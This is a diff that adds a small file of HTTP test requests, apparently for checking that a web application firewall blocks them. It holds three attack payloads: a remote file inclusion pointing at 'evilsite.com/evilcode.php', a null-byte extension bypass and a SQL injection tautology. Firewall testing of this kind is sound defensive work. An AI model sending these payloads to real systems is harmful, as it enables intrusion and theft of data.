@@ -1,0 +1,10 @@
+//These requests will all trigger the WAF with a maximum anomaly score.
+
+###
+GET https://xxx-poc.mngenv102652.com?page=http://evilsite.com/evilcode.php HTTP/1.1
+
+###
+GET https://xxx-poc.mngenv102652.com?file=secret.doc%00.pdf HTTP/1.1
+
+###
+GET https://xxx-poc.mngenv102652.com?text1=%27OR%27%27=%27 HTTP/1.1
